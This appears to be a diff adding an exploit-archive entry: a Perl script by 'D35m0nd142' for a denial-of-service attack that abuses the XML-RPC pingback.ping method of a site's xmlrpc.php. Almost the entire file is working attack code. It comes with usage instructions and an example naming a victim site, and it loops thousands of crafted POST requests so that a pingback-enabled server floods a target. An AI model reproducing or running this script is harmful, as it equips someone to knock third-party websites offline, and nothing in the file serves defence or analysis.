@@ -1,0 +1,67 @@
+id: 20116
+date: 01/08/2013
+title: XML-RPC PingBack API Remote DoS Exploit (through xmlrpc.php)
+author: D35m0nd142
+cves: 
+
+#Exploit Title: XML-RPC PingBack API Remote Denial of Service exploit (through xmlrpc.php)
+#Date: 04/01/2013
+#Category: Remote
+#Exploit Author: D35m0nd142
+#Tested on: (Debian) Linux
+#!/usr/bin/perl
+use LWP::UserAgent;
+use HTTP::Request::Common;
+use IO::Socket::INET;
+system("clear");
+print "***************************************************************************************\n";
+print "*               XML-RPC PingBack API Remote Denial of Service exploit                 *\n";
+print "*      Usage: ./exploit.pl <xml_website> <target> <requests count> <real_article>     *\n";
+print "*   Example: ./exploit.pl www.myblog.com www.victim.com 50000 /blog/virus-protection/ *\n";
+print "*                             Created by D35m0nd142                                   *\n";
+print "***************************************************************************************\n\n";
+my $target = $ARGV[1] ;
+my $xml_site = $ARGV[0];
+my $article = $ARGV[3];
+my $count = $ARGV[2];
+if($count eq '' || $article eq '' || $xml_site eq '' || $target eq '')
+{
+print "\n[!] Usage: ./exploit.pl <xml_website> <target> <requests count> <real article>\n\n";
+exit(1);
+}
+
+if($target !~ /http:\/\//)
+{
+$target = "http://$target";
+}
+if($xml_site !~ /http:\/\//)
+{
+$xml_site = "http://$xml_site";
+}
+
+$full = $target.$article;
+sleep 1;
+
+$text = "<?xml version='1.0' encoding='iso-8859-1'?><methodCall><methodName>pingback.ping</methodName><params><param><value><string>$target</string></value></param><param><value><string>$full</string></value></param></params></methodCall>";
+$request_length= length $text;
+
+print "Sending POST requests . . \n";
+
+$filename = "pingback.txt";
+open(FILE , "> $filename");
+for($i=1;$i<=$count;$i++)
+{
+$sock = IO::Socket::INET->new(PeerAddr => $ARGV[0] , PeerPort => 'http(80)', Proto => 'tcp'); #You can change 'PeerPort' if you need
+$request = "POST /xmlrpc.php HTTP/1.1\r\nHost: $ARGV[0]\r\nUser-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: $request_length\r\n\n<?xml version=\"1.0\" encoding=\"iso-8859-1\"?><methodCall><methodName>pingback.ping</methodName><params><param><value><string>$ARGV[1]</string></value></param><param><value><string>$ARGV[0]$ARGV[3]</string></value></param></params></methodCall>\r\n\r\n";
+sleep 1;
+print $request;
+print $sock $request;
+while(<$sock>)
+{
+print FILE;
+}
+
+}
+#system("rm pingback.txt"); //If you want to save all connections made in pingback.txt file, remove '#' .
+
+#  0day.today [2023-03-25]  #
